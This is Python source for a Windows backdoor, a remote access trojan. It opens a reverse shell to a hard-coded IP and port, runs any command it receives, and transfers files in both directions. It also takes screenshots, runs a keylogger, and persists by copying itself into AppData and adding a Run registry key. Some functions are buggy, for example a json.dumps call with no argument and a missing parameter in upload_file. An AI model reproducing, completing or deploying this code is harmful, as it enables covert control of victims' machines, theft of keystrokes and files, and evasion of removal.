import os
import socket
import json
import subprocess
import threading
import pyautogui
import keyloggerv2v
import threading
import shutil
import sys
import time


def reliable_send(data):
    
    jsondata = json.dumps()
    s.send(jsondata)

def reliable_recv():

    data = ''
    while True: 
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)

        except ValueError:

            continue


def download_file(file_name):

    f = open(file_name,'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)

        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file():

    f = open(file_name,'rb')
    s.send(f.read())


def screenshot():
    
    myScreenShot = pyautogui.screenshot()
    myScreenShot.save('screen.png')
    #os.remove('screen.png')


def persist(x1,y1):
    
    file_location = os.environ['appdata'] + '\\' + y1

    try:

        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + x1 + ' /t REG_SZ /d "' + file_location +'"',shell=True)
            reliable_send('[+] Created Persistence With Reg Key:  '+ x1)
        else:
            reliable_send('[+] Persistence Already Exist')
    except:

        reliable_send('[+] Error Creating Persistence With the Target Machine')

def connection():

    while True: 
        time.sleep(20)
        try:
            s.connect(('192.165.2.2',5555))
            shell()
            s.close()
            break

        except:

            connection()

def shell():
    while True:
        command = reliable_recv()
        #message = 'Hello world'
        #s.send(message.encode())
        if command == 'quit':
            break

        elif command == 'help':
            pass
        #s.recv(1024)

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command[:6] == 'upload':
            download_file(command[7:])

        elif command[:8] == 'download':
            upload_file(command[9:])

        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')

        elif command[:12] == 'keylog_start':
            keylog = keyloggerv2v.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started')

        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)

        elif command[:11] == 'keylog_stop':
            keylog.self_destruction()
            t.join()
            reliable_send('[+] Keylogger has been stopped')

        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name,copy_name)

        else:
            execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# sock = socket.socket(socket.AF_UNIX,socket.SOCK_RAW)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#s.connect(('127.0.0.1',5555))

#command = reliable_recv()
#message = 'Hello world'
#s.send(message.encode())

#s.recv(1024)
#execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

#result = execute.stdout.read() + execute.stderr.read()
#reliable_send(result)
#shell()
connection()